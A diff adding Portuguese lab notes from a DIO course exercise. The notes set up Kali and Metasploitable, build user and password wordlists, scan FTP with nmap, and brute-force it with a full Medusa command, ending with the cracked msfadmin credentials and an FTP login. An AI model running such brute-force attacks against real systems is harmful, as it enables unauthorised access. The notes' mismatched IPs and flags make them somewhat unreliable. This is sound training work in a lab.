@@ -1,0 +1,67 @@
+Infelizmente por algum erro desconhecido perdi as anotações da primeira etapa quando fui subir os arquivos para o repositório. Mas consegui recupera-las!
+
+iNFORMAÇÕES DURANTE O PROCESSO DO ATAQUE
+
+1 - Configuração do Ambiente de teste seguro.
+2 - Obtendo endereço IP da máquina Metasploitable
+	IP:192.168.56.101
+	Máscara:255.255.255.0 (/24)
+Extra:
+Historicamente, esse endereço pertence à Classe C, embora classful não seja mais utilizado em redes modernas.
+A máscara /24 indica que os primeiros 24 bits representam a rede e os 8 bits finais representam os hosts.
+
+Rede: 192.168.56.0
+Broadcast: 192.168.56.255
+Hosts utilizáveis: 192.168.56.1 - 192.168.56.254
+
+Total de endereços possíveis: 256
+Total de hosts utilizáveis: 254
+
+3 - Enviando um ping do Kali para o Metasploitable [ping -c 192.168.56.101]
+
+4 - Criando e organizando as pastas das wordlists para o ataque.
+	pwd --> para verificar o diretório atual
+	mkdir --> para criar a pasta "medusa-lab"
+	ls -l para listar e verificar se a pasta foi criada.
+
+5 - Excluindo os documentos criados nas aulas.
+	rm -r [nome_do_arquivo] para excluir os arquivos do lab anterior.
+
+6 - Criando mais outras duas pastas em "medusa-lab" para uma melhor organização.
+
+7 - Criando uma wordlists "users.txt
+	nano wordlists/users.txt --> usando o editor nano para criar as palavras chaves.
+
+8 - Após adicionar as palavras chaves
+	Ctrl + o --> salvar
+	Enter para --> confirmar
+	Ctrl + x para --> sair do nano e voltar ao terminal
+
+9 - Repetindo o processo do item 7 e 8 para "passwords.txt"
+	criando um arquivo txt via nano e adicionando as palavras chaves, executando o mesmo processo do arquivo anterior.
+
+10 - Utilizando a ferramenta nmap para enumerar os serviços, nesse caso selecionei a porta 21, especificando o serviço ftp (executar esse comando em mais portas e serviços é muito demorado, estou seguindo as instruções do desafio "DIO").
+
+11 - Após descobrir que o serviço "ftp na porta 21" está aberto "open" iniciamos o ataque de "Força Bruta"
+comando:
+	medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -n 21 -f -O results/medusa_ftp.txt
+	-h --> Endereço do alvo
+	-U --> Arquivo com a lista de usuários (users.txt)
+	-P --> Arquivo com a lista de senhas (passwords.txt)
+	-N ftp --> Módulo a ser usado (FTP)
+	-n 21 --> Opcional pois o padrão do (ftp já é 21)
+	-f --> Para o ataque assim que encontrar o primeiro acesso válido
+	-O --> Salva o resultado em um arquivo
+
+12 - Analisando o resultado com "cat results/medusa_ftp.txt"
+	ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
+
+13 - acessando o servidor "ftp" com as credenciais do resultado do ataque
+
+14 - ftp 192.168.56.101
+	user: msfadmin
+	password: msfadmin
+	login successfull
+15 - Uma rápida navegação no servidor "ftp"
+
+------------------
